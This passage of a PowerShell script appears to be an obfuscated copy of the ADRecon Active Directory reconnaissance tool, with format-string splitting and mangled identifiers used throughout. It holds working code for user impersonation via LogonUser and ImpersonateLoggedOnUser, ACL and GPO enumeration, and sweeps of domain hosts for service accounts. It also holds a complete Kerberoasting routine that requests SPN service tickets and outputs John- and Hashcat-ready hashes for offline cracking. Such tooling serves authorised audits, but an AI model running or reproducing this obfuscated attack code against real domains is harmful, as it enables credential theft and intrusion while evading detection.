        }
        Catch
        {
            Write-Warning ("{8}{6}{5}{1}{7}{9}{4}{0}{3}{10}{2}{11}{12}" -f't Conta',' Error while enumer','er Obje','i','o','CL]','et-ADRA','ating ','[G','Ro','n','c','ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.("{1}{0}{2}" -f'pos','dis','e').Invoke()

        If ($Objs)
        {
            Write-Verbose "[*] Total Objects: $([ADRecon.LDAPClass]::ObjectCount($Objs)) "
            Write-Verbose ("{0}{1}{2}"-f '[','-]',' DACLs')
            $DACLObj =   $3y9::("{0}{2}{1}" -f 'D','arser','ACLP').Invoke($Objs, $GUIDs, $Threads)
            Write-Verbose ("{7}{0}{3}{1}{2}{4}{5}{6}"-f ']','- May',' need a Pr',' SACLs ','ivileged Ac','co','unt','[-')
            $SACLObj =   $3y9::("{2}{0}{1}"-f 'ars','er','SACLP').Invoke($Objs, $GUIDs, $Threads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($DACLObj)
    {
        Export-ADR $DACLObj $ADROutputDir $OutputType ("{1}{0}"-f 's','DACL')
        Remove-Variable DACLObj
    }

    If ($SACLObj)
    {
        Export-ADR $SACLObj $ADROutputDir $OutputType ("{1}{0}" -f 'ACLs','S')
        Remove-Variable SACLObj
    }
}

Function Get-ADRGPOReport
{

    param(
        [Parameter(mANdaTorY = $true)]
        [string] $Method,

        [Parameter(mANDAtoRy = $true)]
        [bool] $UseAltCreds,

        [Parameter(MANdatoRY = $true)]
        [string] $ADROutputDir
    )

    If ($Method -eq ("{1}{0}"-f 'S','ADW'))
    {
        Try
        {
            
            $SaveVerbosePreference = $script:VerbosePreference
            $script:VerbosePreference = ("{3}{2}{0}{1}"-f 'lyC','ontinue','t','Silen')
            Import-Module GroupPolicy -WarningAction Stop -ErrorAction Stop | Out-Null
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning ("{11}{0}{13}{10}{9}{8}{5}{15}{12}{6}{7}{1}{2}{14}{4}{3}" -f 't-ADRGPO',' Sk','ipping GP','t','Repor',' the ',' Mod','ule.','g','n',' importi','[Ge','Policy','Report] Error','O','Group')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Return $null
        }
        Try
        {
            Write-Verbose ("{3}{2}{0}{4}{1}"-f 'Rep','XML','PO','[*] G','ort ')
            $ADFileName = -join($ADROutputDir,'\',("{2}{1}{3}{0}" -f 'rt','O','GP','-Repo'),("{0}{1}" -f'.xm','l'))
            Get-GPOReport -All -ReportType XML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning ("{4}{0}{3}{2}{1}"-f ' tool','AS.',' RUN',' using','[*] Run the')
                Write-Warning ((("{4}{6}{9}{1}{11}{0}{2}{7}{3}{10}{14}{5}{12}{13}{8}"-f'er','>{0}','nam',' /','[*] runas /user:<','y','Domain ','e>','xe','FQDN','n','<Us',' ','powershell.e','etonl')) -F  [cHAR]92)
                Return $null
            }
            Write-Warning ("{9}{11}{6}{3}{2}{4}{1}{0}{7}{5}{10}{8}" -f'ting the','get','port','DRGPORe','] Error ','POReport i','et-A',' G','L','[','n XM','G')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        Try
        {
            Write-Verbose ("{3}{2}{1}{0}{4}{5}"-f'port','Re','O','[*] GP',' HTM','L')
            $ADFileName = -join($ADROutputDir,'\',("{0}{2}{1}" -f'G','t','PO-Repor'),("{1}{0}" -f'ml','.ht'))
            Get-GPOReport -All -ReportType HTML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning ("{0}{3}{2}{1}{5}{4}"-f'[*] Ru','in','tool us','n the ','.','g RUNAS')
                Write-Warning ((("{12}{5}{13}{1}{4}{8}{7}{9}{2}{11}{6}{10}{0}{3}" -f'l.e',' FQD','e> ','xe','N>','a','etonly pow','}<Use','{0','rnam','ershel','/n','[*] runas /user:<Dom','in'))-f [chAR]92)
                Return $null
            }
            Write-Warning ("{12}{5}{9}{0}{4}{8}{1}{10}{7}{6}{11}{3}{2}"-f']',' gettin',' XML','in',' Erro','RGPORepo','GPO',' ','r','rt','g the','Report ','[Get-AD')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
    }
    If ($Method -eq ("{1}{0}"-f'DAP','L'))
    {
        Write-Warning ("{7}{1}{0}{6}{11}{3}{12}{4}{10}{9}{2}{8}{5}" -f 'en',' Curr',' ','ly s','ppor','.','tly, the module is','[*]','ADWS','d with','te',' on','u')
    }
}


Function Get-ADRUserImpersonation
{


    [OutputType([IntPtr])]
    [CmdletBinding(deFAUlTPAramETerSETnAMe = {"{2}{0}{1}" -f 'ia','l','Credent'})]
    Param(
        [Parameter(mAndatoRy = $True, pArAmeteRSEtnAme = "CRedEN`T`ial")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(mAndatoRy = $True, pAramETERSetNamE = "toK`eNhan`DLE")]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    If ((  $15HLj7::"CU`RRe`NTt`hREaD".("{0}{2}{1}{3}"-f'G','tApa','e','rtmentState').Invoke() -ne 'STA') -and (-not $PSBoundParameters[("{0}{1}" -f'Q','uiet')]))
    {
        Write-Warning ("{17}{4}{3}{12}{14}{15}{20}{11}{18}{0}{5}{7}{10}{22}{19}{16}{6}{8}{13}{1}{9}{21}{2}{23}" -f 'e-','er','on m','pow','mpersonation] ','threa',' ','ded','token i','so',' ap','rently in a si','ershell.ex','mp','e ','i','t state,','[Get-ADRUserI','ngl','rtmen','s not cur','nati','a','ay not work.')
    }

    If ($PSBoundParameters[("{0}{1}{3}{2}"-f'TokenHa','n','e','dl')])
    {
        $LogonTokenHandle = $TokenHandle
    }
    Else
    {
        $LogonTokenHandle =   $o5F7et::"Z`Ero"
        $NetworkCredential = $Credential.("{1}{4}{0}{3}{2}{5}"-f'Net','Ge','orkCredent','w','t','ial').Invoke()
        $UserDomain = $NetworkCredential."do`main"
        If (-Not $UserDomain)
        {
            Write-Warning ((("{16}{8}{15}{11}{7}{13}{6}{17}{18}{0}{10}{4}{14}{1}{2}{5}{3}{9}{12}"-f' FQDN. (','D','N>','0}<','main ','{','ed',' U','-A','Us','<Do','serImpersonation]','ername>)','se cr','FQ','DRU','[Get','en','tial with Domain')) -F  [chAr]92)
        }
        $UserName = $NetworkCredential."uS`erN`Ame"
        Write-Warning "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        $Result = $Advapi32::("{1}{2}{3}{0}"-f 'r','Lo','go','nUse').Invoke($UserName, $UserDomain, $NetworkCredential."pasSw`orD", 9, 3, [ref]$LogonTokenHandle)
        $LastError =   $hLxC::("{4}{0}{1}{3}{2}"-f't','Wi','r','n32Erro','GetLas').Invoke();

        If (-not $Result)
        {
            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    $Result = $Advapi32::("{3}{4}{1}{0}{2}"-f 'ateLoggedOnUse','on','r','Im','pers').Invoke($LogonTokenHandle)

    If (-not $Result)
    {
        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ("{4}{2}{10}{0}{3}{12}{11}{9}{5}{6}{1}{14}{15}{13}{7}{8}"-f 'ti','als succ','Get-ADR-UserImperson','o','[','e credent','i','onat','ed','ternat','a','l','n] A',' impers','essfu','lly')
    $LogonTokenHandle
}


Function Get-ADRRevertToSelf
{


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    If ($PSBoundParameters[("{1}{3}{2}{0}" -f 'dle','To','n','kenHa')])
    {
        Write-Warning ("{12}{3}{13}{14}{7}{18}{16}{0}{11}{17}{10}{8}{15}{1}{4}{6}{9}{5}{2}"-f 'Reverting token imp','onUser() ','dle','Get-','t','n','oken','vertT','ation and c',' ha','on','e','[','AD','RRe','losing Log','f] ','rs','oSel')
        $Result = $Kernel32::("{0}{2}{1}"-f 'Clo','Handle','se').Invoke($TokenHandle)
    }

    $Result = $Advapi32::("{1}{3}{2}{0}" -f 'tToSelf','Rev','r','e').Invoke()
    $LastError =  $HLXC::("{2}{3}{4}{0}{1}"-f'o','r','Ge','tLastW','in32Err').Invoke();

    If (-not $Result)
    {
        Write-Error "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ("{12}{9}{13}{4}{7}{0}{2}{5}{1}{10}{6}{11}{8}{3}"-f 'f] To','n im','k','ed','tToSe','e',' successfully rev','l','rt','t-A','personation','e','[Ge','DRRever')
}


Function Get-ADRSPNTicket
{

    param(
        [Parameter(maNdAtorY = $true)]
        [string] $UserSPN
    )

    Try
    {
        $Null =   ( GeT-ITEM  ('Var'+'iAb'+'LE:Ah1')  ).vAlUe::("{1}{5}{2}{3}{6}{4}{0}" -f 'lName','Load','t','h','tia','Wi','Par').Invoke(("{0}{2}{3}{1}"-f 'System.Identit','del','yM','o'))
        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
    }
    Catch
    {
        Write-Warning ('[G'+'et'+'-AD'+'RSP'+'NTicket'+'] '+'Err'+'or '+'r'+'eques'+'tin'+'g '+'t'+'icket '+'for'+' '+'SPN'+' '+"$UserSPN")
        Write-Warning "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }

    If ($Ticket)
    {
        $TicketByteStream = $Ticket.("{0}{2}{1}"-f 'Get','quest','Re').Invoke()
    }

    If ($TicketByteStream)
    {
        $TicketHexStream =   (VaRIAble  jCz  -vALu  )::("{1}{2}{0}" -f 'g','T','oStrin').Invoke($TicketByteStream) -replace '-'

        
        
        If ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
        {
            $Etype =  $AQLNX::("{0}{1}"-f'To','Byte').Invoke( $Matches."ETy`pE`Len", 16 )
            $CipherTextLen =   ( vARIabLE  ("A"+"qlnx")  -va )::("{2}{0}{1}" -f'UInt3','2','To').Invoke($Matches."cI`ph`er`T`EXtlen", 16)-4
            $CipherText = $Matches."DA`TatOEnd".("{0}{2}{1}" -f 'S','tring','ubs').Invoke(0,$CipherTextLen*2)

            
            If ($Matches."DAta`T`oEnd".("{0}{2}{1}"-f 'S','g','ubstrin').Invoke($CipherTextLen*2, 4) -ne ("{1}{0}" -f '2','A48'))
            {
                Write-Warning ('['+'G'+'et'+'-ADRSPNTic'+'ket] '+'E'+'rror'+' '+'pars'+'i'+'ng '+'cipher'+'t'+'ext '+'f'+'or '+'the'+' '+'S'+'PN '+' '+(('JZP'+'(J'+'ZP'+'Ti'+'cket.S'+'er'+'vic'+'eP'+'ri'+'nc'+'ipalName).')  -CreplACE ([Char]74+[Char]90+[Char]80),[Char]36)) 
                $Hash = $null
            }
            Else
            {
                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
            }
        }
        Else
        {
            Write-Warning "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). " 
            $Hash = $null
        }
    }
    $Obj = New-Object PSObject
    $Obj | Add-Member -MemberType NoteProperty -Name ("{4}{1}{3}{2}{5}{0}{6}"-f 'l','e','cip','rvicePrin','S','a','Name') -Value $Ticket."sE`R`VicePri`NcipaLName"
    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'E','type') -Value $Etype
    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'sh','Ha') -Value $Hash
    Return $Obj
}

Function Get-ADRKerberoast
{

    param(
        [Parameter(maNDaToRY = $true)]
        [string] $Method,

        [Parameter(maNdAtORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MAndaTORy = $false)]
        [Management.Automation.PSCredential] $Credential =  (vArIABLE ('q3Cu'+'vM')  -vA  )::"E`MPTy",

        [Parameter(mAndAtORy = $true)]
        [int] $PageSize
    )

    If ($Credential -ne   ( vaRiabLE  ("Q3C"+"UvM") -VA  )::"eM`ptY")
    {
        $LogonToken = Get-ADRUserImpersonation -Credential $Credential
    }

    If ($Method -eq ("{1}{0}"-f'S','ADW'))
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter (("{0}{2}{16}{15}{18}{8}{5}{11}{4}{19}{20}{9}{6}{13}{1}{17}{14}{12}{3}{10}{7}" -f '(&(!objec','l:1.2','tClas','3','nc',')(serv','ontr','803:=2))','r','ccountC','556.1.4.','icePri','.11','o','40','om','s=c','.8','pute','ipalName=*)(','!userA')) -Properties sAMAccountName,servicePrincipalName,DistinguishedName -ResultPageSize $PageSize
        }
        Catch
        {
            Write-Warning ("{6}{7}{10}{0}{5}{3}{11}{1}{4}{8}{2}{9}" -f'r wh',' U','bj','mer','serSP','ile enu','[Get-','ADRKer','N O','ects','beroast] Erro','ating')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_."sErviCePr`iNc`iP`AlNaMe")
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f 'e','Usern','am') -Value $_."sA`MACcouNt`NAme"
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{4}{1}{2}{0}{3}"-f'i','i','cePr','ncipalName','Serv') -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_."D`iST`In`guisHedNA`mE".("{1}{2}{0}"-f 'g','S','ubStrin').Invoke($_."dist`InGuis`h`ED`NAME".("{0}{1}"-f 'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Joh','n') -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 't','a','Hashc') -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LD','AP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."pagES`ize" = $PageSize
        $ObjSearcher."FIl`T`ER" = ((("{2}{20}{19}{0}{13}{4}{8}{14}{5}{11}{18}{10}{17}{12}{7}{6}{1}{15}{9}{16}{3}"-f'bj','2.840.','(','))','ss=computer)','Princ','.','l:1','(se','556.1.4.803:','=*)(!user','i','tro','ectCla','rvice','113','=2','AccountCon','palName','!o','&(')))
        $ObjSearcher."p`ROPerT`i`EStoload".("{0}{1}"-f 'Ad','dRange').Invoke((("{1}{4}{0}{3}{2}"-f'e','disting','e','dnam','uish'),("{2}{1}{0}{3}{4}" -f'co','amac','s','un','tname'),("{2}{4}{0}{3}{5}{1}"-f 'inc','ame','servic','ip','epr','aln'),("{3}{2}{0}{1}"-f'tcon','trol','oun','useracc')))
        $ObjSearcher."s`EAR`Ch`sCoPe" = ("{1}{0}" -f 'ree','Subt')
        Try
        {
            $ADUsers = $ObjSearcher.("{1}{0}"-f 'dAll','Fin').Invoke()
        }
        Catch
        {
            Write-Warning ("{10}{4}{2}{1}{0}{3}{11}{6}{9}{8}{7}{5}" -f'num','ile e','rror wh','e',' E','ts','ng','N Objec','serSP',' U','[Get-ADRKerberoast]','rati')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}"-f 'ispose','d').Invoke()

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_."P`ROpERTI`Es"."SeRVI`ce`prin`C`IpALn`A`Me")
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'ername','Us') -Value $_."pR`Op`ertIes"."SamacC`ou`N`TNamE"[0]
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{3}{0}{2}"-f'alN','Serv','ame','icePrincip') -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_."pr`Op`erTiES"."dI`s`TINGU`I`sHedNaMe"[0]."subst`RI`Ng"($_."prOpe`Rt`IES"."distInG`UisH`E`DNAME"[0].("{0}{1}"-f'Inde','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'J','ohn') -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}" -f'Hash','c','at') -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($LogonToken)
    {
        Get-ADRRevertToSelf -TokenHandle $LogonToken
    }

    If ($UserSPNObj)
    {
        Return $UserSPNObj
    }
    Else
    {
        Return $null
    }
}


Function Get-ADRDomainAccountsusedforServiceLogon
{

    param(
        [Parameter(mAnDaTory = $true)]
        [string] $Method,

        [Parameter(maNDAtORy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(maNDaTORY = $false)]
        [Management.Automation.PSCredential] $Credential =   (geT-VaRIaBle  q3CuvM  -VaLUeONl )::"EM`ptY",

        [Parameter(ManDATory = $true)]
        [int] $PageSize,

        [Parameter(MaNdATORy = $false)]
        [int] $Threads = 10
    )

    BEGIN {
        $readServiceAccounts = [scriptblock] {
            
            $hostname = [string] $args[0]
            $OperatingSystem = [string] $args[1]
            
            $Credential = $args[2]
            $timeout = 250
            $port = 135
            Try
            {
                $tcpclient = New-Object System.Net.Sockets.TcpClient
                $result = $tcpclient.("{1}{3}{2}{0}"-f 'ct','B','onne','eginC').Invoke($hostname,$port,$null,$null)
                $success = $result."a`s`y`NcwAitHandLE".("{2}{0}{1}"-f 't','One','Wai').Invoke($timeout,$null)
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) is unreachable $($_.Exception.Message) "
                $success = $false
                $tcpclient.("{0}{1}"-f 'Clo','se').Invoke()
            }
            If ($success)
            {
                
                If ($PSVersionTable."Ps`VerS`iOn"."mA`JOR" -ne 2)
                {
                    If ($Credential -ne   $q3CUVm::"emp`Ty")
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption -Protocol DCOM) -Credential $Credential
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop)
                        }
                    }
                    Else
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption -Protocol DCOM)
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop )
                        }
                    }
                }
                Else
                {
                    If ($Credential -ne   $q3CUVM::"e`mpTY")
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Credential $Credential -Impersonation 3 -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                    Else
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                }
                $serviceList
            }
            Try
            {
                If ($tcpclient) { $tcpclient.("{2}{3}{0}{1}" -f'C','onnect','En','d').Invoke($result) | Out-Null }
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) : $($_.Exception.Message) "
            }
            $warning
        }

        Function processCompletedJobs()
        {
            
            

            $jobs = Get-Job -State Completed
            ForEach( $job in $jobs )
            {
                If ($null -ne $job)
                {
                    $data = Receive-Job $job
                    Remove-Job $job
                }

                If ($data)
                {
                    If ( $data.("{0}{1}" -f 'GetTyp','e').Invoke() -eq [Object[]] )
                    {
                        $serviceList = $data | Where-Object { if ($_."S`TarT`NamE") { $_ }}
                        $serviceList | ForEach-Object {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Accou','nt') -Value $_."StaR`T`NAme"
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{3}{2}{1}" -f'Se','ame','vice N','r') -Value $_."Na`mE"
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f 'mName','Syst','e') -Value $_."Sy`St`eMNa`Me"
                            If ($_."sTArTnA`ME".("{1}{0}" -f'oUpper','t').Invoke().("{0}{1}"-f 'Cont','ains').Invoke($currentDomain))
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name ("{4}{6}{0}{1}{2}{5}{3}" -f 'ning ','as Doma','i','ser','Ru','n U','n') -Value $true
                            }
                            Else
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{4}{2}{3}" -f'Running ','as D','i','n User','oma') -Value $false
                            }
                            $script:serviceAccounts += $Obj
                        }
                    }
                    ElseIf ( $data.("{0}{2}{1}"-f'Ge','Type','t').Invoke() -eq [String] )
                    {
                        $script:warnings += $data
                        Write-Verbose $data
                    }
                }
            }
        }
    }

    PROCESS
    {
        $script:serviceAccounts = @()
        [string[]] $warnings = @()
        If ($Method -eq ("{0}{1}"-f'A','DWS'))
        {
            Try
            {
                $ADDomain = Get-ADDomain
            }
            Catch
            {
                Write-Warning ("{3}{10}{5}{11}{6}{2}{1}{8}{7}{4}{9}{12}{0}" -f't','ogon] Error','L','[Get-ADRDo',' ','Ac','ervice','etting',' g','D','main','countsusedforS','omain Contex')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            If ($ADDomain)
            {
                $currentDomain = $ADDomain."NE`T`B`iOSNaMe".("{2}{0}{1}" -f'oUpp','er','t').Invoke()
                Remove-Variable ADDomain
            }
            Else
            {
                $currentDomain = ""
                Write-Warning ("{4}{6}{8}{9}{5}{0}{1}{3}{7}{2}"-f 'r','ie','d.','v','Cu','ret','rrent Doma','e','in cou','ld not be ')
            }

            Try
            {
                $ADComputers = Get-ADComputer -Filter { Enabled -eq $true -and OperatingSystem -Like ("{2}{3}{1}{0}" -f'ows*','d','*','Win') } -Properties Name,DNSHostName,OperatingSystem
            }
            Catch
            {
                Write-Warning ("{3}{9}{7}{14}{2}{10}{6}{0}{4}{15}{13}{12}{1}{8}{5}{11}" -f 'usedforServiceLogon','g Windo','a','[Get','] ','om','ts','R','ws C','-AD','inAccoun','puter Objects','meratin','ror while enu','Dom','Er')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }

            If ($ADComputers)
            {
                
                
                $cnt = $( ( dir VarIabLE:OBR  ).vaLuE::("{2}{0}{1}" -f 'tCou','nt','Objec').Invoke($ADComputers))
                Write-Verbose ('[*]'+' '+'To'+'tal '+'Win'+'do'+'ws '+'Host'+'s: '+"$cnt")
                $icnt = 0
                $ADComputers | ForEach-Object {
                    $StopWatch =  (  GEt-vaRIAbLE Ps9J5d  ).value::("{2}{1}{0}"-f 'New','tart','S').Invoke()
                    If( $_."Dns`hO`s`TName" )
	                {
                        $args = @($_."Dns`Ho`STNamE", $_."oP`eRA`Ti`NGsystEM", $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch."e`lA`Psed"."t`Ot`Al`mi`L`liSeconDs" -ge 1000)
                        {
                            Write-Progress -Activity ("{1}{2}{3}{0}{4}"-f' ser','Retriev','ing da','ta from','vers') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.("{0}{1}"-f'Rese','t').Invoke()
                            $StopWatch.("{1}{0}" -f 'art','St').Invoke()
		                }
                        while ( ( Get-Job -State Running)."Cou`NT" -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                

                Write-Progress -Activity ("{1}{3}{0}{2}{4}{5}"-f 'g','Ret',' data ','rievin','from s','ervers') -Status ("{3}{4}{11}{10}{5}{8}{6}{7}{1}{0}{2}{9}"-f'm','co','p','Waiti','n','ound','obs',' to ',' j','lete...','for backgr','g ') -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity ("{3}{5}{4}{0}{1}{2}" -f 'r','v','ers','Retri','ing data from se','ev') -Completed -Status ("{1}{0}{2}" -f ' Do','All','ne')
            }
        }

        If ($Method -eq ("{0}{1}" -f 'LDA','P'))
        {
            $currentDomain = ([string]($objDomain."N`AME")).("{0}{1}{2}"-f 'to','Uppe','r').Invoke()

            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher."paGES`i`Ze" = $PageSize
            $ObjSearcher."FI`L`TEr" = (("{14}{7}{6}{4}{9}{3}{13}{17}{11}{16}{10}{15}{19}{18}{8}{12}{5}{1}{0}{2}{20}" -f '*Wi','ratingSystem=','nd','05306','ype',':=2)(ope','samAccountT','(','1.4.8','=8','serAccountC','(!','03','36','(&','ont','u','9)','.','rol:1.2.840.113556','ows*))'))
            $ObjSearcher."PrOpEr`TieST`O`L`oAd".("{2}{1}{0}" -f 'nge','ddRa','A').Invoke((("{1}{0}" -f 'ame','n'),("{2}{0}{1}{3}" -f'o','stn','dnsh','ame'),("{1}{0}{3}{2}"-f'ra','ope','system','ting')))
            $ObjSearcher."sEA`RChsc`Ope" = ("{1}{0}"-f'ree','Subt')

            Try
            {
                $ADComputers = $ObjSearcher.("{1}{0}"-f'All','Find').Invoke()
            }
            Catch
            {
                Write-Warning ("{7}{10}{18}{13}{12}{17}{5}{2}{14}{9}{8}{20}{22}{15}{0}{6}{16}{19}{11}{3}{4}{1}{21}"-f 'umera','bjec','forServ','r ','O','sused','ting W','[Ge','ro','ceLogon] Er','t-','te','DomainAcc','DR','i','n','ind','ount','A','ows Compu','r while ','ts','e')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{1}{0}{2}" -f 'p','dis','ose').Invoke()

            If ($ADComputers)
            {
                
                
                $cnt = $(  (  gEt-vaRIABle ('3'+'Y9')).vALUE::("{0}{2}{1}{3}" -f 'Objec','u','tCo','nt').Invoke($ADComputers))
                Write-Verbose ('[*'+'] '+'Total'+' '+'Wind'+'ow'+'s '+'H'+'osts: '+"$cnt")
                $icnt = 0
                $ADComputers | ForEach-Object {
                    If( $_."PRo`Per`Ties"."DnSH`OST`NaMe" )
	                {
                        $args = @($_."P`R`oPErtIES"."DNSH`O`StnAMe", $_."PRo`pe`RtI`es"."oP`ER`ATings`YS`TeM", $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.Properties.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch."eL`Ap`SED"."toTA`L`MIllI`se`CondS" -ge 1000)
                        {
		                    Write-Progress -Activity ("{3}{4}{0}{2}{1}" -f 'ser','ers','v','Retrieving data fro','m ') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.("{0}{1}"-f 'Rese','t').Invoke()
                            $StopWatch.("{0}{1}"-f 'Sta','rt').Invoke()
		                }
		                while ( ( Get-Job -State Running)."CO`UNt" -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                
                Write-Progress -Activity ("{1}{0}{4}{2}{3}"-f 'vi','Retrie','fro','m servers','ng data ') -Status ("{2}{4}{5}{6}{1}{3}{7}{0}"-f'..','gr','Wa','ound jobs to','iting f','o','r back',' complete.') -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity ("{4}{3}{2}{0}{1}"-f'server','s','om ','ta fr','Retrieving da') -Completed -Status ("{1}{0}"-f'Done','All ')
            }
        }

        If ($script:serviceAccounts)
        {
            Return $script:serviceAccounts
        }
        Else
        {
            Return $null
        }
    }
}

Function Remove-EmptyADROutputDir
{

    param(
        [Parameter(MaNdaTORY = $true)]
        [string] $ADROutputDir,

        [Parameter(MandAtORy = $true)]
        [array] $OutputType
    )

    Switch ($OutputType)
    {
        'CSV'
        {
            $CSVPath  = -join($ADROutputDir,'\',("{1}{2}{0}"-f 'iles','CSV','-F'))
            If (!(Test-Path -Path $CSVPath\*))
            {
                Write-Verbose ('Re'+'moved '+'Empty'+' '+'Di'+'rect'+'ory '+"$CSVPath")
                Remove-Item $CSVPath
            }
        }
